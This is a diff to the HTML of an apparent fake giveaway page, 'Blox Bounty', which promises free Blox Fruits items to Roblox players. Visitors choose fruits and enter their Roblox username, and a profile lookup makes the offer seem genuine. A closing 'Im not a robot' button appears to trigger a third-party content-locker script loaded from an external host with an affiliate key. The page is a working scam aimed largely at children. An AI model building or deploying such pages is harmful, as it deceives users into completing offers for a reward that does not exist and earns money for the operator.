@@ -3,67 +3,96 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Blox Bounty - Claim Your Fruits</title>
+    <title>Blox Bounty | Claim Your Fruits</title>
     <link rel="stylesheet" href="style.css">
-    <link href="https://fonts.googleapis.com/css2?family=Luckiest+Guy&family=Rajdhani:wght@600;700&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Luckiest+Guy&family=Rajdhani:wght@700&display=swap" rel="stylesheet">
 </head>
 <body>
 
-    <div class="main-wrapper">
+    <div class="overlay"></div>
+
+    <div class="container">
         <div class="header">
-            <img src="assets/images/logo.png" alt="Blox Bounty Logo" class="main-logo">
+            <img src="assets/images/logo.png" alt="Blox Fruits" class="main-logo">
         </div>
 
-        <div id="step-login" class="card active">
-            <div class="fire-frame">
-                <h2>Enter Username</h2>
-                <div class="input-container">
-                    <input type="text" id="usernameInput" placeholder="Username..." autocomplete="off">
-                    <p id="errorText" class="error-msg hidden">User not found!</p>
-                </div>
-                <div class="btn-group">
-                    <button id="cancelBtn" class="btn btn-red">CANCEL</button>
-                    <button id="connectBtn" class="btn btn-green">SUBMIT</button>
-                </div>
+        <section id="step-selection" class="step active">
+            <div class="slots-box">
+                <div class="slot fire-glow" id="slot-1"><span>SLOT 1</span></div>
+                <div class="slot fire-glow" id="slot-2"><span>SLOT 2</span></div>
+                <div class="slot fire-glow" id="slot-3"><span>SLOT 3</span></div>
             </div>
-        </div>
 
-        <div id="step-fruits" class="card hidden">
-            <div class="slots-container">
-                <div class="slot fire-glow" id="slot-1">SLOT 1</div>
-                <div class="slot fire-glow" id="slot-2">SLOT 2</div>
-                <div class="slot fire-glow" id="slot-3">SLOT 3</div>
-            </div>
-            
-            <button id="continueBtn" class="btn btn-green btn-full hidden">CONTINUE</button>
+            <h2 class="section-title">CHOOSE 3 FRUITS TO CLAIM</h2>
 
             <div class="fruits-grid">
-                <div class="fruit-item" data-name="Kitsune"><img src="assets/images/kitsune.png"><button>CLAIM</button></div>
-                <div class="fruit-item" data-name="Leopard"><img src="assets/images/leopard.png"><button>CLAIM</button></div>
-                <div class="fruit-item" data-name="Dragon"><img src="assets/images/dragon.png"><button>CLAIM</button></div>
-                <div class="fruit-item" data-name="Dough"><img src="assets/images/dough.png"><button>CLAIM</button></div>
-                <div class="fruit-item" data-name="Venom"><img src="assets/images/venom.png"><button>CLAIM</button></div>
-                <div class="fruit-item" data-name="Buddha"><img src="assets/images/buddha.png"><button>CLAIM</button></div>
-            </div>
-        </div>
-
-        <div id="step-verify" class="card hidden">
-            <div class="verify-box">
-                <p class="final-text">You are in the final stage.<br>Are you ready to Unlock?</p>
-                <div class="fire-frame-btn">
-                    <button id="lockerBtn" class="btn-verify">Im not a robot 🏴‍☠️</button>
+                <div class="fruit-card" data-name="Kitsune" data-img="assets/images/kitsune.png">
+                    <img src="assets/images/kitsune.png">
+                    <button class="claim-btn">CLAIM</button>
+                </div>
+                <div class="fruit-card" data-name="Leopard" data-img="assets/images/leopard.png">
+                    <img src="assets/images/leopard.png">
+                    <button class="claim-btn">CLAIM</button>
+                </div>
+                <div class="fruit-card" data-name="Dragon" data-img="assets/images/dragon.png">
+                    <img src="assets/images/dragon.png">
+                    <button class="claim-btn">CLAIM</button>
+                </div>
+                <div class="fruit-card" data-name="Dough" data-img="assets/images/dough.png">
+                    <img src="assets/images/dough.png">
+                    <button class="claim-btn">CLAIM</button>
+                </div>
+                <div class="fruit-card" data-name="Trex" data-img="assets/images/trex.png">
+                    <img src="assets/images/trex.png">
+                    <button class="claim-btn">CLAIM</button>
+                </div>
+                <div class="fruit-card" data-name="Buddha" data-img="assets/images/buddha.png">
+                    <img src="assets/images/buddha.png">
+                    <button class="claim-btn">CLAIM</button>
                 </div>
             </div>
-        </div>
+            
+            <button id="next-to-login" class="main-btn hidden">CONTINUE TO CONNECT</button>
+        </section>
+
+        <section id="step-login" class="step hidden">
+            <div class="glass-card fire-border">
+                <h2>CONNECT ACCOUNT</h2>
+                <p>Enter your Roblox username to receive the items.</p>
+                <div class="input-wrapper">
+                    <input type="text" id="usernameInput" placeholder="Roblox Username...">
+                    <p id="errorMsg" class="error-text hidden">User not found!</p>
+                </div>
+                
+                <div id="api-result" class="user-profile hidden">
+                    <div class="avatar-ring"><img id="userAvatar" src=""></div>
+                    <h3 id="displayName"></h3>
+                    <div class="user-stats">
+                        <span>Followers: <b id="followerCount"></b></span>
+                    </div>
+                </div>
+
+                <button id="connectBtn" class="main-btn">CONNECT NOW</button>
+                <button id="finalStepBtn" class="main-btn hidden">PROCEED TO VERIFY</button>
+            </div>
+        </section>
+
+        <section id="step-verify" class="step hidden">
+            <div class="verify-box fire-border">
+                <img src="assets/images/fire-border.gif" class="fire-bg">
+                <h3>Final Stage</h3>
+                <p>Are you ready to unlock your fruits?</p>
+                <button id="lockerTrigger" class="verify-btn">Im not a robot 🏴‍☠️</button>
+            </div>
+        </section>
     </div>
 
-    <audio id="sndClick" src="assets/audio/click.mp3"></audio>
-    <audio id="sndError" src="assets/audio/error.mp3"></audio>
-    <audio id="sndSelect" src="assets/audio/select.mp3"></audio>
+    <audio id="clickSnd" src="assets/audio/click.mp3"></audio>
+    <audio id="errorSnd" src="assets/audio/error.mp3"></audio>
+    <audio id="selectSnd" src="assets/audio/select.mp3"></audio>
 
+    <script src="script.js"></script>
     <script type="text/javascript">var PSNBB_sVt_hlKyAc={"it":4586440,"key":"a355c"};</script>
     <script src="https://duw03nk63ml3f.cloudfront.net/24c5ab2.js"></script>
-    
-    <script src="script.js"></script>
 </body>
 </html>
